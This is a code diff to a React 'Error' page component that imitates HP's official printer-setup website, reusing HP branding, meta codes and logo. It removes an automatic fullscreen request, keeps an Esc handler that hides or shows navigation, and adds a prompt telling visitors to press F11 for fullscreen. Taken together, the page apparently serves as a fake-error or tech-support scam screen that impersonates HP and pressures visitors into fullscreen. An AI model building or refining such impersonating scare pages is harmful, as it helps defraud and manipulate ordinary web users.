@@ -5,15 +5,15 @@ import { bigimage, hplogo } from "../../assets/images";
 const Error = () => {
   const [showNavigation, setShowNavigation] = useState(false);
 
-  useEffect(() => {
-    // Function to handle "Esc" key press event
-    const handleEscKeyPress = (event) => {
-      if (event.keyCode === 27) {
-        // "Esc" key is pressed
-        setShowNavigation(!showNavigation); // Toggle navigation visibility
-      }
-    };
+  // Function to handle "Esc" key press event
+  const handleEscKeyPress = (event) => {
+    if (event.keyCode === 27) {
+      // "Esc" key is pressed
+      setShowNavigation(!showNavigation); // Toggle navigation visibility
+    }
+  };
 
+  useEffect(() => {
     // Add event listener for "Esc" key press
     document.addEventListener("keydown", handleEscKeyPress);
 
@@ -23,44 +23,13 @@ const Error = () => {
     };
   }, [showNavigation]); // Re-run effect whenever showNavigation state changes
 
-  useEffect(() => {
-    // Enter fullscreen mode when component mounts
-    const enterFullscreen = () => {
-      const element = document.documentElement;
-      if (element.requestFullscreen) {
-        element.requestFullscreen();
-      } else if (element.mozRequestFullScreen) {
-        element.mozRequestFullScreen();
-      } else if (element.webkitRequestFullscreen) {
-        element.webkitRequestFullscreen();
-      } else if (element.msRequestFullscreen) {
-        element.msRequestFullscreen();
-      }
-    };
-
-    enterFullscreen();
-
-    // Exit fullscreen mode when component unmounts
-    return () => {
-      if (document.exitFullscreen) {
-        document.exitFullscreen();
-      } else if (document.mozCancelFullScreen) {
-        document.mozCancelFullScreen();
-      } else if (document.webkitExitFullscreen) {
-        document.webkitExitFullscreen();
-      } else if (document.msExitFullscreen) {
-        document.msExitFullscreen();
-      }
-    };
-  }, []);
-
   return (
     <html country="GB" lang="en" dir="ltr">
       <head>
-        <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+        <meta content="IE=edge" httpEquiv="X-UA-Compatible" />
         <meta content="hpi" name="company_code" />
         <meta content="IPG" name="bu" />
-        <meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
+        <meta content="text/html; charset=UTF-8" httpEquiv="Content-Type" />
         <meta
           name="description"
           content="Welcome to the HP® Official website to setup your printer. Get started with your new printer by downloading the software. You will be able to connect the printer to a network and print across devices."
@@ -129,6 +98,9 @@ const Error = () => {
             </a>
           </center>
         </main>
+        <p style={{ textAlign: "center" }}>
+          Press <strong>F11</strong> to enter fullscreen mode
+        </p>
       </body>
     </html>
   );
